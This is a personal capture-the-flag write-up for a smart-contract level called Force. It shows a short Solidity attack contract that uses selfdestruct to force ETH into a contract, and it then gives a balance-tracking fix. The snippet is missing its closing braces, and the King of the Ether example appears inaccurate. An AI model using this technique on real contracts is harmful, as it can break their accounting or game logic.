# Level 7: Force

Date: January 27, 2026
Status: Done

## The Challenge

Force ETH into a contract that has no receive(), fallback(), or payable functions.

## The Bug

The contract has no way to accept ETH normally, but selfdestruct can FORCE ETH into any address.

The Force contract:

contract Force {
    // Empty - no functions at all
}


No way to receive ETH normally, but selfdestruct bypasses this.

## How I Did It

Created an attack contract with ETH, then self-destructed it targeting the Force contract:

contract ForceAttack {
    constructor() payable {}
    
 function attack(address payable target) public {
        selfdestruct(target);

Deployed with 0.001 ETH, called attack(Force address), ETH was forced into Force.

## Why It Matters

Developers often assume:

 Contract balance only changes through their functions
 Can use `address(this).balance` for logic
 Contract controls when it receives ETH

All FALSE. Selfdestruct can force ETH into ANY contract.

This breaks:
- Accounting (tracked deposits ≠ actual balance)
- Balance-based logic (DoS attacks)
- Game mechanics (unexpected funds)

Real example: King of the Ether (2016) - broken by forced ETH

## The Fix

NEVER rely on address(this).balance for critical logic.

Instead, track balances manually:

uint256 public trackedBalance;

function deposit() external payable {
    trackedBalance += msg.value;
}

// Use trackedBalance, not address(this).balance


## What I Learned

selfdestruct is a forced transfer that bypasses ALL contract logic.

Contract balance can ALWAYS be manipulated via selfdestruct.

For security-critical contracts, always maintain internal balance tracking.

Note: selfdestruct is deprecated in newer EVM versions but still exists in deployed contracts.

7/29 done.
